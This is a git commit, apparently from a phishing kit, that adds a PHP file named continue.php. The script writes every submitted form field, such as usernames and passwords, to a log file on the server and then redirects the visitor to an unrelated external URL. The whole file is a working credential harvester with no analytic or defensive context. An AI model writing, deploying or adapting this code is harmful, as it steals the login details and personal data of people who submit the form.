efe621691049620b6b0243df097f700d08258943
EloquentOrator <142227870+EloquentOrator@users.noreply.github.com>
2023-08-14 18:30:59 +0600

    Add files via upload
    Signed-off-by: EloquentOrator <142227870+EloquentOrator@users.noreply.github.com>

---
+++ continue.php
@@ -0,0 +1,13 @@
+﻿<?php
+header ('Location: http://makeyourwet.com/bX4pPDPY?tag=360');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
